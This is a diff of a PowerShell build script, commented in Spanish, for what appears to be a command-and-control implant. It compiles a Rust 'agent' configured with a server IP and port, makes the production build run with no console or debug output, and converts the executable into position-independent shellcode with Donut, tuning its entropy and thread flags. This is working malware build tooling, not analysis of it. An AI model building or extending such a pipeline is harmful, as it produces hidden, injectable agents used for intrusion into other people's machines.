@@ -85,7 +85,10 @@ $env:SERVER_IP = $ServerIP
 $env:SERVER_PORT = $ServerPort
 
 # Determinar features para el agent
+# En producción: usamos --no-default-features para deshabilitar 'dev' y activamos solo 'production'
+# En desarrollo: usamos la feature 'dev' por defecto
 $agentFeatures = if ($Production) { "production" } else { "dev" }
+$noDefaultFeatures = if ($Production) { "--no-default-features" } else { "" }
 
 Write-Host ""
 Write-Color "🔨 Compilando componentes..." Cyan
@@ -294,15 +297,32 @@ if (Test-Path $vsWhere) {
     }
 }
 
-cargo build --release --package agent --features $agentFeatures 2>&1 | ForEach-Object {
-    if ($_ -match "error|failed") {
-        Write-Color $_ Red
-    } elseif ($_ -match "warning") {
-        Write-Color $_ Yellow
-    } elseif ($_ -match "Compiling|Finished") {
-        Write-Color $_ Cyan
-    } else {
-        Write-Host $_
+# Build agent con las features correctas
+# En producción: --no-default-features --features production (sin consola, sin debug)
+# En desarrollo: --features dev (con consola para debug)
+if ($Production) {
+    cargo build --release --package agent --no-default-features --features production 2>&1 | ForEach-Object {
+        if ($_ -match "error|failed") {
+            Write-Color $_ Red
+        } elseif ($_ -match "warning") {
+            Write-Color $_ Yellow
+        } elseif ($_ -match "Compiling|Finished") {
+            Write-Color $_ Cyan
+        } else {
+            Write-Host $_
+        }
+    }
+} else {
+    cargo build --release --package agent --features dev 2>&1 | ForEach-Object {
+        if ($_ -match "error|failed") {
+            Write-Color $_ Red
+        } elseif ($_ -match "warning") {
+            Write-Color $_ Yellow
+        } elseif ($_ -match "Compiling|Finished") {
+            Write-Color $_ Cyan
+        } else {
+            Write-Host $_
+        }
     }
 }
 
@@ -316,7 +336,8 @@ if ($LASTEXITCODE -eq 0) {
     if (Test-Path $donutExe) {
         $agentExePath = "dist\${AgentName}.exe"
         $agentBinPath = "dist\${AgentName}.bin"
-        & $donutExe -a 2 -f 1 -x 1 -e 3 -i $agentExePath -o $agentBinPath 2>&1 | Out-Null
+        # -a 2 = x64, -f 1 = binary, -x 2 = exit process, -e 3 = entropy, -t = new thread
+        & $donutExe -a 2 -f 1 -x 2 -e 3 -t -i $agentExePath -o $agentBinPath 2>&1 | Out-Null
         if (Test-Path $agentBinPath) {
             $shellcodeSize = (Get-Item $agentBinPath).Length
             Write-Color "✅ Agent shellcode: ${agentBinPath} ($shellcodeSize bytes)" Green
